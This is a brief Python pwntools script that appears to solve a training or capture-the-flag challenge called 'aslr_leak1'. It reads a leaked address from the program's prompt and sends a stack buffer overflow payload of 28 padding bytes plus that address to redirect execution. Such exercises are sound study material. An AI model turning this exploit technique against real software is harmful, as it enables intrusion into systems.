#!/usr/bin/python
from pwn import *
context.terminal = ['tmux','new-window']
e = ELF('aslr_leak1')
io = process(e.path)
#gdb.attach(io)
prompt = io.recv(500)
print(prompt)

address = prompt.split("@")[1].strip()
win_address = p32(int(address,16))
io.sendline(b'a' * 28 + win_address + b'ffff')
io.interactive()
